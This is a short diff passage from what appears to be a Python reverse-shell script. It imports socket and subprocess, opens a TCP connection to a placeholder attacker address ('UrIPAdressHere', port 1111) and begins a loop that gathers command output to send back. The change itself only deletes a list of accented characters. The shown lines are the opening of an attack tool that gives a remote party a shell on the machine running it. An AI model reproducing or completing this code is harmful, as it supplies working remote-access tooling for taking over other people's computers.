@@ -2,7 +2,6 @@ import os, socket, subprocess
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(("UrIPAdressHere", 1111))
-invalidsChars = ["é", "ç", "è", "à", "ù"]
 
 while True:
 	out1 = err1 =""
